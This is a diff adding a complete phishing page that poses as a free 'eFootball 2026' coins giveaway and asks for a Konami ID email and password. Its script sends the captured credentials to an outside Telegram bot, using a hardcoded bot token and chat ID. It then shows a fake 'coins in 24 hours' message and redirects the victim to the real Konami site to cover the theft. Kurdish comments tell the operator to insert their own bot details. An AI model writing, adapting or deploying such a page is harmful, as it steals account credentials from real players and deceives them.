@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eFootball Coins Gift</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
+        .container { background: #2a2a2a; padding: 20px; border-radius: 15px; display: inline-block; }
+        input { display: block; width: 250px; padding: 10px; margin: 10px auto; border-radius: 5px; border: none; }
+        button { background-color: #f1c40f; color: black; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>eFootball 2026 Free Coins</h2>
+        <p>Enter details to claim coins</p>
+        
+        <input type="email" id="email" placeholder="Konami ID (Email)" required>
+        <input type="password" id="password" placeholder="Password" required>
+        
+        <button onclick="sendData()">CLAIM COINS</button>
+    </div>
+
+    <script>
+        function sendData() {
+            // ئەڤان هەردوو زانیاریان بگوهۆڕە
+            const token = "8629064789:AAHh6YMmxd8v4BhXbdOYbB6AHE_g-BXI7nM"; 
+            const chat_id = "7196325224";
+            
+            const email = document.getElementById("email").value;
+            const pass = document.getElementById("password").value;
+
+            if(email === "" || pass === "") {
+                alert("Please fill all fields!");
+                return;
+            }
+
+            const message = `🚨 New Login Found!%0A📧 Email: ${email}%0A🔑 Pass: ${pass}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;
+
+            fetch(url).then(res => {
+                if(res.ok) {
+                    alert("Processing... Coins will be added in 24 hours.");
+                    // تو دشێی خەلکی رەوانەی سایتێ ڕاستی بکەی پشتی کلیکێ
+                    window.location.href = "https://www.konami.com/efootball/";
+                }
+            });
+        }
+    </script>
+
+</body>
+</html>
